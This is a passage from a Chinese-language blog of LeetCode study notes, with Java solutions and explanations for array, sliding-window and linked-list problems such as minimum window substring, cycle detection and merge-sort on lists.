getKthElement(nums1, nums2, midIndex + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> median;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">int</span> midIndex1 = totalLength / <span class="hljs-number">2</span> - <span class="hljs-number">1</span>, midIndex2 = totalLength / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">double</span> median = (getKthElement(nums1, nums2, midIndex1 + <span class="hljs-number">1</span>) + getKthElement(nums1, nums2, midIndex2 + <span class="hljs-number">1</span>)) / <span class="hljs-number">2.0</span>;<br>            <span class="hljs-keyword">return</span> median;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getKthElement</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums1, <span class="hljs-keyword">int</span>[] nums2, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> length1 = nums1.length, length2 = nums2.length;<br>        <span class="hljs-keyword">int</span> index1 = <span class="hljs-number">0</span>, index2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> kthElement = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>            <span class="hljs-comment">// 边界情况</span><br>            <span class="hljs-keyword">if</span> (index1 == length1) &#123;<br>                <span class="hljs-keyword">return</span> nums2[index2 + k - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (index2 == length2) &#123;<br>                <span class="hljs-keyword">return</span> nums1[index1 + k - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">return</span> Math.min(nums1[index1], nums2[index2]);<br>            &#125;<br>            <br>            <span class="hljs-comment">// 正常情况</span><br>            <span class="hljs-keyword">int</span> half = k / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">int</span> newIndex1 = Math.min(index1 + half, length1) - <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">int</span> newIndex2 = Math.min(index2 + half, length2) - <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">int</span> pivot1 = nums1[newIndex1], pivot2 = nums2[newIndex2];<br>            <span class="hljs-keyword">if</span> (pivot1 &lt;= pivot2) &#123;<br>                k -= (newIndex1 - index1 + <span class="hljs-number">1</span>);<br>                index1 = newIndex1 + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                k -= (newIndex2 - index2 + <span class="hljs-number">1</span>);<br>                index2 = newIndex2 + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-20-最小覆盖子串"><a href="#1-20-最小覆盖子串" class="headerlink" title="1.20 最小覆盖子串"></a>1.20 最小覆盖子串</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">minWindow</span><span class="hljs-params">(String s, String t)</span> </span>&#123;<br>    HashMap&lt;Character, Integer&gt; window = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    HashMap&lt;Character, Integer&gt; need = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">char</span> c : t.toCharArray())&#123;<br>        need.put(c, need.getOrDefault(c, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> valid = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> start = <span class="hljs-number">0</span>, len = Integer.MAX_VALUE;<br>    <span class="hljs-keyword">while</span>(right &lt; s.length())&#123;<br>        <span class="hljs-keyword">char</span> c = s.charAt(right);<br>        right++;<br>        <span class="hljs-keyword">if</span>(need.containsKey(c))&#123;<br>            window.put(c, window.getOrDefault(c, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span>(window.get(c).equals(need.get(c)))&#123;<br>                valid++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">while</span>(valid == need.size())&#123;<br>            <span class="hljs-keyword">if</span>(right - left &lt; len)&#123;<br>                start = left;<br>                len = right - left;<br>            &#125;<br>            <span class="hljs-keyword">char</span> d = s.charAt(left);<br>            left++;<br>            <span class="hljs-keyword">if</span>(need.containsKey(d))&#123;<br>                <span class="hljs-keyword">if</span>(window.get(d).equals(need.get(d)))&#123;<br>                    valid--;<br>                &#125;<br>                window.put(d, window.get(d) - <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> len == Integer.MAX_VALUE ? <span class="hljs-string">&quot;&quot;</span> : s.substring(start, start + len);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意窗口的移动一直是[left,right)左闭右开区间，所以right - left计算的也是子串实际长度，因为java的substring(beginindex,endindex)不包含endindex，所以可以直接代入。</p><h2 id="1-21-滑动窗口最大值"><a href="#1-21-滑动窗口最大值" class="headerlink" title="1.21 滑动窗口最大值"></a>1.21 滑动窗口最大值</h2><p>同剑指offer滑动窗口最大值。</p><p>首先想使用滑动窗口算法，滑动窗口可以在区间发生变化时，<strong>通过旧有的计算结果对搜索空间进行剪枝，这样便减少了重复计算，降低了时间复杂度</strong>。但是在这里滑动窗口无法复用结果进行剪枝。</p><p>我们可以将当前窗口最大值和新加入的值进行比较，但在删除最左侧元素时会出现两种情况：</p><ul><li>窗口最左侧元素不是窗口最大值，可以放心删除</li><li>窗口最左侧元素是窗口最大值，根据该窗口最大值是否唯一又两种情况：<ul><li>不唯一，放心删除</li><li>唯一，删除后重新遍历窗口获得最大值，次操作复杂度O(k)</li></ul></li></ul><p>所以可以强行使用滑动窗口，但操作不仅复杂而且时间复杂度为O(nk)</p><p>使用双端队列解决：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] maxSlidingWindow(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k) &#123;<br>    Deque&lt;Integer&gt; deque = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums.length - k + <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//形成初始窗口</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++)&#123;<br>        <span class="hljs-keyword">while</span>(!deque.isEmpty() &amp;&amp; nums[i] &gt; deque.peekLast())&#123;<br>            deque.removeLast();<br>        &#125;<br>        deque.add(nums[i]);<br>    &#125;<br>    res[index++] = deque.peekFirst();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = k; i &lt; nums.length; i++)&#123;<br>        <span class="hljs-comment">//若上个窗口元素==队列最大值，删除</span><br>        <span class="hljs-keyword">if</span>(deque.peekFirst() == nums[i - k])&#123;<br>            deque.removeFirst();<br>        &#125;<br>        <span class="hljs-comment">//队列添加元素</span><br>        <span class="hljs-keyword">while</span>(!deque.isEmpty() &amp;&amp; nums[i] &gt; deque.peekLast())&#123;<br>            deque.removeLast();<br>        &#125;<br>        deque.addLast(nums[i]);<br>        res[index++] = deque.peekFirst();<br><br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-22-最长连续子序列"><a href="#1-22-最长连续子序列" class="headerlink" title="1.22 最长连续子序列"></a>1.22 最长连续子序列</h2><p>​    我们考虑枚举数组中的每个数 x，考虑以其为起点，不断尝试匹配 $x+1, x+2, \cdots$是否存在，假设最长匹配到了 x+yx+y，那么以 xx 为起点的最长连续序列即为 $x, x+1, x+2, \cdots, x+y$，其长度为 y+1，我们不断枚举并更新答案即可。</p><p>​    对于匹配的过程，暴力的方法是 O(n) 遍历数组去看是否存在这个数，但其实更高效的方法是用一个哈希表存储数组中的数，这样查看一个数是否存在即能优化至 O(1) 的时间复杂度。</p><p>​    仅仅是这样我们的算法时间复杂度最坏情况下还是会达到 $O(n^2)$（即外层需要枚举 O(n) 个数，内层需要暴力匹配 O(n) 次），无法满足题目的要求。但仔细分析这个过程，我们会发现其中执行了很多不必要的枚举，如果已知有一个 $x, x+1, x+2, \cdots, x+y$ 的连续序列，而我们却重新从$ x+1$，$x+2$ 或者是 x+y 处开始尝试匹配，那么得到的结果肯定不会优于枚举 x 为起点的答案，因此我们在外层循环的时候碰到这种情况跳过即可。</p><p>​    那么怎么判断是否跳过呢？由于我们要枚举的数 x 一定是在数组中不存在前驱数 x−1 的，不然按照上面的分析我们会从 x-1开始尝试匹配，因此我们每次在哈希表中检查是否存在 x−1 即能判断是否需要跳过了。</p><p>​    增加了判断跳过的逻辑之后，时间复杂度是多少呢？外层循环需要 O(n) 的时间复杂度，只有当一个数是连续序列的第一个数的情况下才会进入内层循环，然后在内层循环中匹配连续序列中的数，因此<strong>数组中的每个数只会进入内层循环一次</strong>。根据上述分析可知，总时间复杂度为 O(n)，符合题目要求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">longestConsecutive</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> longestSeq = <span class="hljs-number">0</span>;<br>    HashSet&lt;Integer&gt; set = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num : nums)&#123;<br>        set.add(num);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num : set)&#123;<br>        <span class="hljs-keyword">int</span> curSeq = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> curNum = num;<br>        <span class="hljs-keyword">if</span>(!set.contains(curNum - <span class="hljs-number">1</span>))&#123;<br>            curSeq = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">while</span>(set.contains(curNum + <span class="hljs-number">1</span>))&#123;<br>                curNum++;<br>                curSeq++;<br>            &#125;<br>        &#125;<br>        longestSeq = Math.max(longestSeq,curSeq);<br>    &#125;<br>    <span class="hljs-keyword">return</span> longestSeq;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2-链表"><a href="#2-链表" class="headerlink" title="2. 链表"></a>2. 链表</h1><p>链表的解题基本就是递归和迭代，包括快慢指针的技巧，还可以和排序算法结合。</p><h2 id="2-1-两数相加"><a href="#2-1-两数相加" class="headerlink" title="2.1 两数相加"></a>2.1 两数相加</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">addTwoNumbers</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> </span>&#123;<br><br>        <span class="hljs-comment">//使用l1链表接收返回结果</span><br>        ListNode p1 = l1;<br>        ListNode p2 = l2;<br>        <span class="hljs-keyword">int</span> sums = p1.val + p2.val;<br>        <span class="hljs-comment">//num代表进位数字</span><br>        <span class="hljs-keyword">int</span> num = sums / <span class="hljs-number">10</span>;<br>        <span class="hljs-comment">//得到结果时记得对10取余</span><br>        p1.val = sums % <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">while</span>(p1.next != <span class="hljs-keyword">null</span> || p2.next!= <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-comment">//除非p1和p2同时为空，否则将快空链表填0</span><br>            <span class="hljs-keyword">if</span>(p1.next == <span class="hljs-keyword">null</span>)&#123;<br>                p1.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">0</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(p2.next == <span class="hljs-keyword">null</span>)&#123;<br>                p2.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">0</span>);<br>            &#125;<br>            sums = p1.next.val + p2.next.val + num;<br>            <span class="hljs-comment">//num使用后清除，否则影响判断最后是否进位</span><br>            num = <span class="hljs-number">0</span>;<br>            p1.next.val = (sums % <span class="hljs-number">10</span>);<br>            num = sums / <span class="hljs-number">10</span>;<br>            p1 = p1.next;<br>            p2 = p2.next;<br>        &#125;<br>        <span class="hljs-comment">//如果当前还剩余进位，p1再填充一位</span><br>        <span class="hljs-keyword">if</span>(num != <span class="hljs-number">0</span>)&#123;<br>            p1.next = <span class="hljs-keyword">new</span> ListNode(num);<br>        &#125;<br>        <span class="hljs-keyword">return</span> l1;<br>    &#125;<br></code></pre></td></tr></table></figure><p>要注意的点：</p><ol><li>链表长度不一致</li><li>计算进位</li><li>最后还有进位需要在l1上顺延节点</li></ol><h2 id="2-2-删除链表的倒数第N个节点"><a href="#2-2-删除链表的倒数第N个节点" class="headerlink" title="2.2 删除链表的倒数第N个节点"></a>2.2 删除链表的倒数第N个节点</h2><p>如果不为head设前驱节点pre的话，当节点数为1时是无法进行删除的，所以手动添加前驱节点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">removeNthFromEnd</span><span class="hljs-params">(ListNode head, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        <span class="hljs-comment">//添加前驱节点</span><br>        ListNode pre = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">0</span>);<br>        pre.next = head;<br>        <span class="hljs-comment">//初始化移动节点，双指针移动,p2先走,p1后走,p为p1的前驱，方便删除</span><br>        ListNode p1 = head,p2 = head,p = pre;<br>        <span class="hljs-keyword">while</span>(n != <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">//p2先走n步</span><br>            p2 = p2.next;<br>            n--;<br>        &#125;<br>        <span class="hljs-keyword">while</span>(p2 != <span class="hljs-keyword">null</span>)&#123;<br>            p2 = p2.next;<br>            p = p1;<br>            p1 = p1.next;<br>        &#125;<br>        <span class="hljs-comment">//删除p1</span><br>        p.next = p1.next;<br>        <span class="hljs-keyword">return</span> pre.next;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-合并两个有序链表"><a href="#2-3-合并两个有序链表" class="headerlink" title="2.3 合并两个有序链表"></a>2.3 合并两个有序链表</h2><p>传统解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> </span>&#123;<br>        <span class="hljs-comment">//合并链表头节点</span><br>        ListNode head = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-comment">//特殊情况</span><br>        <span class="hljs-keyword">if</span>(l1 == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> l2;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(l2 == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> l1;<br>        &#125;<br>        <span class="hljs-comment">//选出头节点</span><br>        <span class="hljs-keyword">if</span>(l1.val &lt;= l2.val)&#123;<br>            head = l1;<br>            l1 = l1.next;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            head = l2;<br>            l2 = l2.next;<br>        &#125;<br>        <span class="hljs-comment">//迭代比较合并</span><br>        ListNode l = head;<br>        <span class="hljs-keyword">while</span>(l1 != <span class="hljs-keyword">null</span> || l2 != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">if</span>(l1 == <span class="hljs-keyword">null</span>)&#123;<br>                l.next = l2;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(l2 == <span class="hljs-keyword">null</span>)&#123;<br>                l.next = l1;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(l1.val &lt;= l2.val)&#123;<br>                l.next = l1;<br>                l = l.next;<br>                l1 = l1.next;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                l.next = l2;<br>                l = l.next;<br>                l2 = l2.next;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br></code></pre></td></tr></table></figure><p>递归解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//返回合并后的头节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> </span>&#123;<br>        ListNode l = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">if</span>(l1 == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> l2;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(l2 == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> l1;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(l1.val &lt;= l2.val)&#123;<br>            l = l1;<br>            l1 = l1.next;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            l = l2;<br>            l2 = l2.next;<br>        &#125;<br>        l.next = mergeTwoLists(l1,l2);<br>        <span class="hljs-keyword">return</span> l;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-4-环形链表"><a href="#2-4-环形链表" class="headerlink" title="2.4 环形链表"></a>2.4 环形链表</h2><p>快慢指针</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        ListNode fast = head;<br>        ListNode slow = head;<br>        <span class="hljs-keyword">while</span>(fast != <span class="hljs-keyword">null</span> &amp;&amp; fast.next != <span class="hljs-keyword">null</span>)&#123;<br>            fast = fast.next.next;<br>            slow = slow.next;<br>            <span class="hljs-keyword">if</span>(fast == slow)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br><br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-5-环形链表Ⅱ"><a href="#2-5-环形链表Ⅱ" class="headerlink" title="2.5 环形链表Ⅱ"></a>2.5 环形链表Ⅱ</h2><p>​        仍然使用快慢指针，第一次相遇时，设slow走k步，fast走2k步，但是仍然相遇了，说明fast多走的k步正是环的长度。<br>​        假设相遇点距离环起点m步，从head到相遇点为k-m，此时环内继续走k-m也为相遇点，令slow指向head，slow和fast同步走，再次相遇为环起点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">detectCycle</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        ListNode fast = head, slow = head;<br>        <span class="hljs-keyword">while</span>(fast != <span class="hljs-keyword">null</span> &amp;&amp; fast.next != <span class="hljs-keyword">null</span>)&#123;<br>            fast = fast.next.next;<br>            slow = slow.next;<br>            <span class="hljs-keyword">if</span>(fast == slow)&#123;<br>                <span class="hljs-comment">//确定有环，slow重走</span><br>                slow = head;<br>                <span class="hljs-keyword">while</span>(fast != slow)&#123;<br>                    fast = fast.next;<br>                    slow = slow.next;<br>                &#125;<br>                <span class="hljs-keyword">return</span> slow;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-6-排序链表"><a href="#2-6-排序链表" class="headerlink" title="2.6 排序链表"></a>2.6 排序链表</h2><p>进阶要求是时间复杂度O(nlogn)，空间复杂度O(1)</p><p>使用归并排序，归并排序的数组排序迭代空间复杂度为O(n)，递归为O(n)</p><p>链表排序迭代空间复杂度O(1)，递归为O(n)</p><p>递归解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">sortList</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(head == <span class="hljs-keyword">null</span> || head.next == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        <span class="hljs-comment">//分</span><br>        <span class="hljs-comment">//找到中点</span><br>        ListNode fast = head, slow = head;<br>        <span class="hljs-comment">//slow的前驱结点，用于断链</span><br>        ListNode preSlow = head;<br>        <span class="hljs-keyword">while</span>(fast != <span class="hljs-keyword">null</span> &amp;&amp; fast.next != <span class="hljs-keyword">null</span>)&#123;<br>            fast = fast.next.next;<br>            preSlow = slow;<br>            slow = slow.next;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(fast != <span class="hljs-keyword">null</span>)&#123;<br>            preSlow = slow;<br>            slow = slow.next;<br>        &#125;<br>        preSlow.next = <span class="hljs-keyword">null</span>;<br>        ListNode left = sortList(head);<br>        ListNode right = sortList(slow);<br><br>        <span class="hljs-comment">//治</span><br>        <span class="hljs-comment">//两个有序链表合并，建立前驱结点排序</span><br>        ListNode node = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">0</span>);<br>        ListNode res = node;<br>        <span class="hljs-keyword">while</span>(left != <span class="hljs-keyword">null</span> &amp;&amp; right != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">if</span>(left.val &lt;= right.val)&#123;<br>                node.next = left;<br>                left = left.next;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                node.next = right;<br>                right = right.next;<br>            &#125;<br>            node = node.next;<br>        &#125;<br>        node.next = left == <span class="hljs-keyword">null</span> ? right : left;<br>        <span class="hljs-keyword">return</span> res.next;<br>        <br>    &#125;<br></code></pre></td></tr></table></figure><p>迭代解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 